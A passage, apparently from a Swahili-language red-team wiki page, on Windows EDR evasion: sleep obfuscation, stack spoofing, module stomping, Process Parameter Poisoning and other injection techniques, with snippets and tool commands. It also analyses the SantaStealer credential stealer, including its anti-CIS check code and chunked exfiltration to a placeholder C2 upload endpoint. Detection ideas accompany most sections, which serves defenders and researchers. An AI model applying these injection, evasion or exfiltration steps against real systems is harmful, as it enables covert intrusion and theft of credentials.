- Tumia mabadiliko ya RW → RX kwa PIC na epuka kuacha kurasa zikiwa writable+executable.

Stub ya call-stack spoofing
- PIC stubs za mtindo wa Draugr hutengeneza call chain bandia (return addresses zinazoelekeza kwenye modules zisizo na madhara), kisha huingia kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs zinapofikia APIs nyeti.
- Oanisha na mbinu za stack cutting/stack stitching ili kuingia ndani ya frames zinazotarajiwa kabla ya API prologue.

Ujumuishaji wa kiutendaji
- Weka reflective loader mwanzoni mwa post-ex DLLs ili PIC na hooks zianze kiotomatiki DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike kwa uwazi na njia ileile ya evasion bila mabadiliko ya code.

Mazingatio ya Detection/DFIR
- Uadilifu wa IAT: entries zinazoelekeza kwenye anwani zisizo za image (heap/anon); ukaguzi wa mara kwa mara wa import pointers.
- Hitilafu za Stack: return addresses zisizomilikiwa na images zilizopakiwa; mabadiliko ya ghafla kwenda kwenye PIC isiyo ya image; mfuatano wa asili wa RtlUserThreadStart usiolingana.
- Telemetry ya Loader: writes za ndani ya mchakato kwenye IAT, shughuli za mapema za DllMain zinazobadilisha import thunks, RX regions zisizotarajiwa zinazoundwa wakati wa load.
- Kuepuka image-load: ukihook LoadLibrary*, fuatilia loads zinazotiliwa shaka za automation/clr assemblies zinazohusiana na matukio ya memory masking.

Vipengele vya msingi vinavyohusiana na mifano
- Reflective loaders zinazofanya IAT patching wakati wa load (k.m., TitanLdr, AceLdr)
- Memory masking hooks (k.m., simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (k.m., Draugr)


## Hooking ya IAT Wakati wa Import + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks wakati wa import kupitia PICO inayokaa kwenye memory

Ikiwa unadhibiti reflective loader, unaweza kuhook imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na custom resolver inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Tengeneza **resident PICO** (persistent PIC object) inayobaki baada ya transient loader PIC kujifuta.
- Export function ya `setup_hooks()` inayobadilisha import resolver ya loader (k.m., `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka ordinal imports na utumie hook lookup inayotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; la sivyo, elekeza kwenye `GetProcAddress` halisi.
- Sajili hook targets wakati wa link kwa entries za Crystal Palace `addhook "MODULE$Func" "hook"`. Hook hubaki halali kwa sababu iko ndani ya resident PICO.

Hii huwezesha **IAT redirection wakati wa import** bila kufanya patching kwenye code section ya DLL iliyopakiwa baada ya load.

### Kulazimisha imports zinazoweza kuhookiwa wakati target inatumia PEB-walking

Hooks za wakati wa import hufanya kazi tu ikiwa function ipo kwenye IAT ya target. Ikiwa module inatatua APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili loader's `ProcessImports()` path iweze kuiona:

- Badilisha utatuzi wa hashed export (k.m., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na reference ya moja kwa moja kama `&WaitForSingleObject`.
- Compiler hutoa IAT entry, na hivyo kuwezesha interception reflective loader inapotatua imports.

### Ekko-style sleep/idle obfuscation bila kufanya patching ya `Sleep()`

Badala ya ku-patch `Sleep`, hook **wait/IPC primitives halisi** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, funga call ndani ya obfuscation chain ya mtindo wa Ekko inayosimba image iliyo kwenye memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazopiga `NtContinue` zikiwa na `CONTEXT` frames zilizotengenezwa.
- Mlolongo wa kawaida (x64): weka image kuwa `PAGE_READWRITE` → isimba kwa RC4 kupitia `advapi32!SystemFunction032` kwenye image nzima iliyomapishwa → fanya blocking wait → isimbue kwa RC4 → **rejesha ruhusa za kila section** kwa kupitia PE sections → toa ishara ya kukamilika.
- `RtlCaptureContext` hutoa kiolezo cha `CONTEXT`; nakili kwenye frames nyingi na uweke registers (`Rip/Rcx/Rdx/R8/R9`) ili kuita kila hatua.

Maelezo ya kiutendaji: rudisha “success” kwa waits ndefu (k.m., `WAIT_OBJECT_0`) ili caller iendelee wakati image imefichwa. Muundo huu huficha module dhidi ya scanners wakati wa idle na huepuka signature ya kawaida ya “patched `Sleep()`”.

Mawazo ya detection (yanayotegemea telemetry)
- Milipuko ya callbacks za `CreateTimerQueueTimer` zinazoelekeza kwa `NtContinue`.
- `advapi32!SystemFunction032` kutumika kwenye buffers kubwa mfululizo zenye ukubwa wa image.
- `VirtualProtect` ya eneo kubwa ikifuatiwa na urejeshaji maalum wa ruhusa za kila section.

### Usajili wa CFG wakati wa runtime kwa sleep-obfuscation gadgets

Kwenye targets zenye CFG, indirect jump ya kwanza kwenda kwenye gadget ya katikati ya function kama `jmp [rbx]` au `jmp rdi` kwa kawaida itasababisha mchakato ku-crash kwa `STATUS_STACK_BUFFER_OVERRUN` kwa sababu gadget haipo kwenye metadata ya CFG ya module. Ili kuweka chains za mtindo wa Ekko/Kraken zikifanya kazi ndani ya michakato iliyoimarishwa:<sup>[[30]](#references)</sup>

- Sajili kila indirect destination inayotumiwa na chain kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na entries za `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya images zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ihusishe **ukubwa wote wa image**.
- Kwa maeneo yaliyomapishwa kwa mikono/PIC/stomped, tumia **allocation base** na allocation size badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia exports zinazofikiwa kwa indirect (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na sections zozote zinazoweza kutekelezeka zinazodhibitiwa na mshambuliaji ambazo zitakuwa indirect targets.

Hii hubadilisha sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi kwenye michakato isiyo na CFG pekee” na kuzifanya primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe` na endpoints nyingine zilizocompiliwa kwa `/guard:cf`.

### Stack spoofing salama kwa CET kwa threads zinazolala

Kubadilisha `CONTEXT` yote kunaonekana wazi na kunaweza kushindwa kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyofanyiwa spoofing lazima bado ilingane na hardware shadow stack. Muundo salama zaidi wa sleep-masking ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine katika mchakato huohuo na usome mipaka ya stack yake ya `NT_TIB` / TEB (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Nasa context halisi ya thread inayolala kwa `GetThreadContext`.
- Nakili **`Rip` halisi pekee** kwenye spoof context, huku ukiacha `Rsp`/hali ya stack iliyofanyiwa spoofing bila kubadilika.
- Wakati wa sleep window, nakili `NT_TIB` ya spoof thread kwenye TEB ya sasa ili stack walkers zifuatilie stack range halali.
- Baada ya wait kukamilika, rejesha TIB na thread context ya awali.

Hii huhifadhi instruction pointer inayolingana na CET huku ikiwapotosha EDR stack walkers wanaotegemea metadata ya stack ya TEB kuthibitisha unwinds.

### Njia mbadala inayotegemea APC: Kraken Mask

Ikiwa timer-queue dispatch inatambulika sana kwa signature, mfuatano huohuo wa sleep-encrypt-spoof-restore unaweza kutekelezwa kutoka kwa helper thread iliyosimamishwa kwa kutumia queued APCs:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Queue `CONTEXT` frames/APCs zilizotayarishwa kwa `NtQueueApcThread` na zitekeleze kwa `NtAlertResumeThread`.
- Hifadhi hali ya chain kwenye heap badala ya helper stack ili kuepuka kutumia kupita kiasi thread stack ya kawaida ya KB 64.
- Tumia `NtSignalAndWaitForSingleObject` kutoa ishara kwa start event na kuzuia kwa wakati mmoja.
- Simamisha main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza race window ambayo scanner inaweza kunasa stack iliyorejeshwa nusu.

Hii hubadilisha signature ya `CreateTimerQueueTimer` + `NtContinue` na kuweka signature ya helper-thread/APC huku ikidumisha malengo yaleyale ya RC4 masking na stack-spoofing.

Mawazo ya ziada ya detection
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits au APC dispatch.
- `GetThreadContext`/`SetThreadContext` zinazozungushiwa `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na writes za moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Chains za `NtQueueApcThread`/`NtAlertResumeThread` zinazoelekeza kwa njia isiyo ya moja kwa moja kwenye `SystemFunction032`, `VirtualProtect` au helpers za kurejesha ruhusa za section.
- Matumizi yanayojirudia ya gadget signatures fupi kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya signed modules.


## Module Stomping ya Usahihi

Module stomping huendesha payloads kutoka kwenye **`.text` section ya DLL ambayo tayari ime-mapishwa ndani ya target process** badala ya kutenga memory ya faragha inayoweza kutekelezwa na inayoonekana wazi au kupakia DLL mpya ya kutumika kama kafara. Target ya overwrite inapaswa kuwa **image iliyopakiwa kutoka disk** ambayo code space yake inaweza kuchukua payload bila kuharibu code paths ambazo mchakato bado unahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Kuchagua target kwa uhakika

Stomping ya moja kwa moja dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si ya uhakika: huenda DLL haijapakiwa kwenye remote process, na code region ndogo mno itasababisha mchakato ku-crash. Workflow ya kuaminika zaidi ni:

1. Orodhesha modules za target process na uhifadhi **include list ya majina pekee** ya DLLs ambazo tayari zimepakiwa.
2. Tengeneza payload kwanza na urekodi **ukubwa wake kamili kwa byte**.
3. Changanua DLL zinazoweza kuchaguliwa kwenye disk na ulinganishe PE section **`.text` `Misc_VirtualSize`** na ukubwa wa payload. Hili ni muhimu zaidi kuliko ukubwa wa faili kwa sababu linaonyesha ukubwa wa executable section **inapomapishwa kwenye memory**.
4. Parse **Export Address Table (EAT)** na uchague function RVA iliyosafirishwa kama stomp start offset.
5. Kokotoa **blast radius**: ikiwa payload inazidi mpaka wa function iliyochaguliwa, itafuta exports zilizo karibu ambazo zimepangwa baada yake kwenye memory.

Helpers za kawaida za recon/uchaguzi zinazoonekana wazi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Pendelea kutumia DLL ambazo **tayari zimepakiwa** kwenye mchakato wa mbali ili kuepuka telemetry ya `LoadLibrary`/upakiaji wa image usiotarajiwa.
- Pendelea exports ambazo programu lengwa huzitekeleza mara chache; vinginevyo, njia za kawaida za msimbo zinaweza kufikia bytes zilizobadilishwa kabla au baada ya kuunda thread.
- Implants kubwa mara nyingi huhitaji kubadilisha jinsi shellcode inavyowekwa ndani ya injector: badala ya string literal, tumia **byte-array/braced initializer** ili buffer nzima iwakilishwe kwa usahihi kwenye source ya injector.

Detection ideas
- Maandishi ya mbali yanayoandikwa kwenye kurasa za executable zinazotegemea image (`MEM_IMAGE`, `PAGE_EXECUTE*`), badala ya allocations za kawaida zaidi za private RWX/RX.
- Entry points za export ambazo bytes zake zilizo kwenye memory hazilingani tena na faili inayotumika kama chanzo kwenye diski.
- Remote threads au context pivots zinazoanza kutekelezwa ndani ya export halali ya DLL ambayo bytes zake za mwanzo zimebadilishwa hivi karibuni.
- Mfuatano wa kutiliwa shaka wa `VirtualProtect(Ex)` / `WriteProcessMemory` unaolenga kurasa za `.text` za DLL, ukifuatiwa na uundaji wa thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa njia ya kawaida ya remote write (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes kwenye mchakato lengwa ambao tayari unaendeshwa, hutumia ukweli kwamba Windows **hunakili vigezo fulani vya uanzishaji vya `CreateProcessW` hadi kwenye mchakato mtoto** na kuviweka ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Carriers muhimu ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya carriers vinavyohusika kiutendaji:

- `lpCommandLine` lazima ielekeze kwenye memory inayoweza kuandikwa na `CreateProcessW`, na ina kikomo cha **herufi 32,767 za Unicode** zikiwemo null terminator.
- `lpEnvironment` lazima iwe environment block ya Unicode yenye mfuatano wa string za `NAME=VALUE\0` na kuishia na `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hivyo uhusiano wa `ShellInfo` unapaswa kuchukuliwa kama maelezo ya utekelezaji badala ya mkataba thabiti ulioandikwa kwenye nyaraka.

Hii hugeuza uundaji wa kawaida wa mchakato kuwa **primitive ya kuhamisha payload**. Operator huunda mchakato mtoto kwa data ya uanzishaji inayodhibitiwa na mshambuliaji na kuiacha Windows ifanye unakilishaji kati ya michakato.

### Remote lookup flow without remote write APIs

Baada ya mtoto kuundwa, tafuta buffer iliyonakiliwa kwa kutumia primitives za **kusoma pekee**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma `PEB` ya mbali
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Mtiririko wa chini kabisa:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kutekeleza buffer ya parameter iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si la kutekelezeka. Mfuatano wa kawaida wa P3 ni:

1. Unda process kawaida (bila kuisimamisha)
2. Fanya ukurasa wa parameter uliochaguliwa uweze kutekelezeka kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena handle ya thread kuu ambayo tayari imerudishwa kwenye `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, badilisha `RIP`)

Tofauti na taratibu za kawaida za thread hijacking, hili **halihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kupitia handle ya thread kuu iliyorudishwa.

Hili huepuka API kadhaa ambazo kwa kawaida hufuatiliwa kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha null-byte na shellcode ya hatua kwa hatua

Carriers zote tatu ni **data ya string au inayofanana na string**, kwa hivyo payload ghafi yenye `0x00` hukatwa wakati wa uhamishaji. Njia ya vitendo ya kukabiliana na hili ni **hatua ya kwanza isiyo na null** inayounda upya constants wakati wa utekelezaji, kisha kupakia hatua ya pili yoyote.

Muundo rahisi ni usanisi wa constant unaotumia XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Hii huruhusu hatua ya kwanza kuunda strings za stack, arguments za API, paths za DLL, au loader ya shellcode ya hatua ya pili bila kuweka null bytes kwenye parameter inayosafirishwa.

### Miito ya API inayotegemea stack kutoka hatua ya kwanza

Wakati hatua ya kwanza inahitaji kuita API kama `LoadLibraryA`, inaweza:

- kusukuma string/buffer kwenye stack ya target
- kutenga **32-byte x64 shadow space**
- kuweka `RCX`, `RDX`, `R8`, `R9` kwenye constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` imepangiliwa kwa **16-byte** kabla ya mwito

Kisha hatua ya pili inaweza kunakiliwa kutoka kwenye stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, na kurukuliwa, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya ugunduzi

Fursa nzuri za uchunguzi zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kubadilisha **kurasa za process-parameter kuwa executable**
- mabadiliko hayo ya ulinzi yakifuatiwa na `SetThreadContext` / `NtSetContextThread`
- usomaji wa mbali wa `PEB` kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu au zenye entropy ya juu isiyo ya kawaida wakati wa kuunda process

### Vidokezo

- P3 ni **mbinu ya kuhamisha data kati ya processes**, si primitive kamili ya execution yenyewe: parameter iliyonakiliwa bado inahitaji kubadilishiwa ruhusa ya execution na njia ya kuelekeza execution.
- `RtlCreateProcessReflection` / Dirty Vanity ilizingatiwa na waandishi lakini ikakataliwa kwa sababu ndani yake hutumia primitives zinazotia shaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## Console STDIN pipe injection

Child process ya console shirikishi pia inaweza kutumika kama **primitive ya kuhamisha payload**. Injector huelekeza standard input ya child process kwenye pipe na kutuma marker ikifuatiwa na shellcode. Programu ya console inaposoma data kwenye memory yake binafsi, injector hutafuta buffer hiyo, huifanya iwe executable na kuelekeza thread ya child process kuielekea. Hii huepuka `VirtualAllocEx` na `WriteProcessMemory`, lakini bado ni process injection badala ya mbinu ya jumla ya kukwepa EDR.<sup>[[41]](#references)</sup>

Licha ya maelezo ya "named-pipe", implementation ya rejea huita `CreatePipe`, ambayo huunda **anonymous pipe**. Windows hutekeleza anonymous pipes kwa kutumia pipe objects zenye majina ya kipekee ndani ya mfumo, lakini PoC haichagui njia ya `\\.\pipe\<name>` wala kuita `CreateNamedPipe`. Huunda handles zinazoweza kurithiwa zikiwa na security descriptor ya chaguomsingi, huweka handle ya kusoma kwenye `STARTUPINFO.hStdInput`, huweka `STARTF_USESTDHANDLES`, kisha huzindua child mpya huku urithishaji wa handle ukiwa umewashwa. Kwa hiyo, PoC hii huzindua console executable iliyotolewa; haiunganishi pipe yake na process iliyopo.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Mtiririko wa kazi wa rejea

Implementation hutumia mlolongo ufuatao:<sup>[[41]](#references)</sup>

1. Unda jozi za anonymous pipe kwa `STDIN` na `STDOUT` za child process. Zima urithishaji kwenye handles mbili za upande wa parent process na funga nakala za upande wa child process katika parent process baada ya kuunda process.
2. Zindua executable shirikishi kama `netsh.exe` au `nslookup.exe` kwa `CREATE_NEW_CONSOLE`. Child process hurithi standard handles zilizoelekezwa upya.
3. Tuma array kamili ya binary ya `rawData` kwa `WriteFile` kupitia handle ya `STDIN` ya upande wa parent. Programu ya console hutumia bytes hizo na kuacha nakala kwenye mojawapo ya maeneo yake binafsi yaliyo-commit.
4. Kagua address space ya child process kwa `VirtualQueryEx`, soma maeneo ya `MEM_PRIVATE` yanayoweza kufaa kwa `ReadProcessMemory`, kisha tafuta marker mwanzoni mwa `rawData`.
5. Badilisha buffer iliyogunduliwa iwe `PAGE_EXECUTE_READWRITE` kwa `VirtualProtectEx`.
6. Tambua thread kuu, isimamishe, weka `RIP` iwe `found_address + 0x19` kwa `NtSetContextThread`, kisha uendeleze thread.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Utekelezaji uliotolewa ni maalum kwa x64: hubadilisha `CONTEXT.Rip`, na payload yake iliyopachikwa ni x64 shellcode. `rawData` huanza na alama ya baiti 25, kwa hiyo baiti zinazotekelezeka huanza kwenye offseti ya heksadesimali `0x19`. Unapobadilisha payload, hifadhi mpangilio huo au usasishe alama, vekta ya utafutaji, ukubwa wa array na offseti ya utekelezaji pamoja. Maoni ya chanzo pia yanataja `0x0A`, `0x0D` na `0x1A` kama vibambo visivyofaa. Mtiririko huu haubadilishi tokeni au privileges za mchakato mtoto.<sup>[[41]](#references)</sup>

Kwa mifumo ya kuunda native helpers ndogo na payload, tazama [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Uingizaji wa DLL kupitia callback ya thread-pool bila shellcode (DLLParty)

DLLParty hurekebisha uingizaji wa thread-pool wa mtindo wa PoolParty ili kufanya worker iliyopo kwenye target iite `LoadLibraryA`, badala ya kutekeleza callback stub iliyoingizwa. Primitive yake ya dispatch ni completion ya `TP_DIRECT` inayowekwa kwenye foleni ya I/O completion port ya pool ya target. Hii haikwepi ruhusa za mchakato: PoC huita `OpenProcess(PROCESS_ALL_ACCESS)` na inahitaji kumbukumbu ya target inayoweza kusomwa/kuandikwa pamoja na handles za worker-factory na completion-port zinazoweza kunakiliwa.<sup>[[46]](#references)[[47]](#references)</sup>

Kwenye Windows x64, worker hupitisha pointeri ya `TP_CALLBACK_INSTANCE` iliyo kwenye stack yake kupitia `RCX`, hoja ya kwanza ya callback. `LoadLibraryA` hutafsiri pointeri hiyo hiyo kama `LPCSTR`. Kwenye njia iliyojaribiwa, `TppWorkerThread` huunda pointeri kwenye `RSP+0x178`, huku uandishi wake wa kwanza wa kawaida kwenye kitu hicho ukiwa kwenye `RSP+0x1d0`. Kwa hiyo, njia ya DLL iliyoishia na null na inayotoshea ndani ya kiambishi awali hiki cha baiti 0x58 inaweza kuwekwa mwanzoni mwa instance bila kufutwa kabla ya dispatch. Huu ni uchunguzi maalum kwa build husika, si dhamana iliyorekodiwa ya Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Mtiririko wa rejea ni:<sup>[[46]](#references)[[47]](#references)</sup>

1. Orodhesha handles za target kwa `NtQuerySystemInformation(SystemHandleInformation)` na utambue `TpWorkerFactory` kwa kuuliza aina za object. Nakili handle ya worker-factory na uulize `WorkerFactoryBasicInformation`; `StartParameter` hutoa `TP_POOL` ya mbali. Ruka factories zenye `TotalWorkerCount == 0`.
2. Soma `TP_POOL.CompletionPort` na pitia orodha binafsi ya workers ya pool. Kwenye build iliyojaribiwa ya Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`), kichwa chake kiko kwenye `pool+0x60`; kila kiungo kiko kwenye `worker+0x10`, kwa hiyo nafasi ya callback-instance kwenye `worker+0x38` ni sawa na `link+0x28`. PoC hukagua mpangilio wa pointeri, ulinganifu wa viungo, umiliki wa pool, thread IDs zisizo sifuri, nodes zinazorudiwa na kichwa cha orodha kilicho thabiti.
3. Andika njia ya DLL kwenye nafasi za workers **zote** zilizopatikana kwa sababu completion iliyowekwa kwenye foleni inaweza kuchukuliwa na worker yeyote. Weka `TP_DIRECT` kwenye kumbukumbu ya target inayoweza kuandikwa, ikiwa na `Callback = LoadLibraryA`. PoC hutumia `last_slot-0x500` kwenye stack ya worker badala ya `VirtualAllocEx`; offseti hiyo ni ya majaribio na haipaswi kugongana na data amilifu ya stack.
4. Nakili handle ya completion-port ya target na uite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Anwani ya `TP_DIRECT` ya mbali ndiyo completion key. Worker iliyopo kisha huita `LoadLibraryA` kwa pointeri yake ya callback-instance iliyobadilishwa, na kupakia DLL ambayo target inaweza kuifikia.

PoC hupokea PID ya target (`DLLParty.exe <target_pid>`) na hutumia njia ya DLL iliyowekwa moja kwa moja ndani ya `DLLParty.cpp`; weka njia ambayo target inaweza kufikia kabla ya kuunda executable ya x64. Pia hutumia anwani ya `LoadLibraryA` ya mchakato wake yenyewe kama callback ya mbali, kwa hiyo hudhani kuwa anwani hiyo inatumika kwenye target. Msimbo haukague urefu wa njia dhidi ya kiambishi awali cha baiti 0x58, wala kama upitiaji wa workers ulipata nafasi kabla ya kuorodhesha kipengele cha mwisho. Thibitisha upya offseti binafsi, mpangilio wa stack na nafasi inayoweza kuandikwa kwa build ya target. Kuacha `CreateRemoteThreadEx`, shellcode na `VirtualAllocEx` hakuzuii uandishi kati ya michakato au telemetry ya upakiaji wa DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Mbinu za SantaStealer za Kukwepa Ufuatiliaji Bila Faili na Kuiba Sifa za Kuingia

SantaStealer (pia huitwa BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyounganisha AV bypass, anti-analysis na ufikiaji wa sifa za kuingia katika mtiririko mmoja.<sup>[[24]](#references)</sup>

### Uzuiaji kulingana na mpangilio wa kibodi na kuchelewesha sandbox

- Alama ya usanidi (`anti_cis`) huorodhesha mipangilio ya kibodi iliyosakinishwa kupitia `GetKeyboardLayoutList`. Ikipata mpangilio wa Kisiriliki, sample huweka alama tupu ya `CIS` na kujiondoa kabla ya kuendesha stealers, na hivyo kuhakikisha kwamba haitatekelezwa kwenye maeneo yaliyotengwa huku ikiiacha alama inayoweza kutafutwa.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mantiki ya `check_antivm` yenye tabaka

- Variant A hupitia orodha ya michakato, huhash kila jina kwa checksum maalum ya rolling, na kulinganisha matokeo na blocklist zilizopachikwa za debuggers/sandboxes; hurudia checksum hiyo kwa jina la kompyuta na hukagua saraka za kazi kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (kikomo cha chini cha idadi ya michakato, muda mfupi tangu mfumo kuwashwa), huita `OpenServiceA("VBoxGuest")` ili kugundua VirtualBox additions, na hukagua muda unaotumika wakati wa kusubiri ili kutambua single-stepping. Hit yoyote husababisha kusitishwa kabla modules hazijazinduliwa.

### Helper isiyotumia faili + reflective loading ya ChaCha20 mara mbili

- DLL/EXE kuu hupachika helper ya Chromium ya credentials ambayo aidha huandikwa kwenye diski au hupakiwa mwenyewe kwenye memory; katika hali isiyotumia faili, hutatua imports/relocations yenyewe ili kusiandikwe mabaki yoyote ya helper.
- Helper hiyo huhifadhi DLL ya hatua ya pili iliyosimbwa mara mbili kwa ChaCha20 (keys mbili za baiti 32 + nonces za baiti 12). Baada ya hatua zote mbili, huipakia blob kwa reflective loading (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zinazotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing ili kujidunga kwenye Chromium browser inayoendesha, kurithi keys za AppBound Encryption, na kusimbua passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya uimarishaji wa ABE.

### Ukusanyaji wa modular kwenye memory na uhamishaji wa data kupitia HTTP kwa vipande

- `create_memory_based_log` hupitia jedwali la kimataifa la function pointers `memory_generators` na kuanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti idadi ya faili baada ya kipindi cha kusubiri cha kuunganisha threads cha takriban sekunde 45.
- Baada ya kukamilika, kila kitu hubanwa kuwa ZIP kwa kutumia maktaba ya `miniz` iliyounganishwa kwa statically kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutuma archive kwa HTTP POST katika vipande vya MB 10 kwenda `http://<C2>:6767/upload`, huku ikijifanya kutumia browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, na kwa hiari `w: <campaign_tag>`; kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa kuunganisha upya kumekamilika.

## References

- [1] [Mbinu za Kina za Kukwepa Ulinzi: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blogu](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, hakuna tena pasi za bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – nyaraka](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – mfano](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – mfano](https://tradecraftgarden.org/stackcutting.html)
